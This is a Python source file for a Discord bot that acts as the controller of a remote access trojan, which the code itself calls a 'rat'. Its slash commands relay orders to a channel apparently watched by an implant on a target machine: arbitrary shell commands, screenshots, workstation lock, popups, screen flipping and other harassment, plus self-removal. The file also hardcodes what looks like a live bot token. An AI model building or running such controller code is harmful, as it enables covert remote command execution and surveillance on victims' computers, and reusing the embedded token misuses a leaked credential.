# language: Python, file: bot.py, runtime: py3.10+, deps: discord.py, aiohttp
import os
import discord
from discord import app_commands

TOKEN = os.environ.get("DISCORD_TOKEN", "MTU1NzgzNzgxNTYyOTQ4ODI4OA.Gt-dfq.fQrTeWq8dl9s3fkc-3cO_K_-Ugmb6OT3RV9sO4")
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "1557831376202502144"))

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)


@client.event
async def on_ready():
    await tree.sync()
    print(f"bot online as {client.user}", flush=True)


async def _relay(interaction: discord.Interaction, payload: str):
    ch = client.get_channel(CHANNEL_ID)
    if ch is None:
        await interaction.response.send_message("channel not found", ephemeral=True)
        return
    await ch.send(payload)
    await interaction.response.send_message(f"sent: `{payload}`", ephemeral=True)


@tree.command(name="ping", description="health check")
async def _ping(i: discord.Interaction):
    await _relay(i, "ping")

@tree.command(name="help", description="show commands")
async def _help(i: discord.Interaction):
    await _relay(i, "help")

@tree.command(name="flip", description="flip target screen")
async def _flip(i: discord.Interaction):
    await _relay(i, "flip")

@tree.command(name="swap", description="swap mouse buttons")
async def _swap(i: discord.Interaction):
    await _relay(i, "swap")

@tree.command(name="spam", description="popup spam")
async def _spam(i: discord.Interaction):
    await _relay(i, "spam")

@tree.command(name="cd", description="eject cd tray")
async def _cd(i: discord.Interaction):
    await _relay(i, "cd")

@tree.command(name="vol", description="max volume")
async def _vol(i: discord.Interaction):
    await _relay(i, "vol")

@tree.command(name="shake", description="shake cursor")
async def _shake(i: discord.Interaction):
    await _relay(i, "shake")

@tree.command(name="rick", description="rickroll")
async def _rick(i: discord.Interaction):
    await _relay(i, "rick")

@tree.command(name="speak", description="make target speak")
async def _speak(i: discord.Interaction):
    await _relay(i, "speak")

@tree.command(name="screenshot", description="capture screen")
async def _screenshot(i: discord.Interaction):
    await _relay(i, "screenshot")

@tree.command(name="lock", description="lock workstation")
async def _lock(i: discord.Interaction):
    await _relay(i, "lock")

@tree.command(name="shell", description="run shell command")
@app_commands.describe(cmd="command to run")
async def _shell(i: discord.Interaction, cmd: str):
    await _relay(i, f"shell {cmd}")

@tree.command(name="msg", description="popup message")
@app_commands.describe(text="popup text")
async def _msg(i: discord.Interaction, text: str):
    await _relay(i, f"msg {text}")

@tree.command(name="uninstall", description="remove rat")
async def _uninstall(i: discord.Interaction):
    await _relay(i, "uninstall")


client.run(TOKEN)
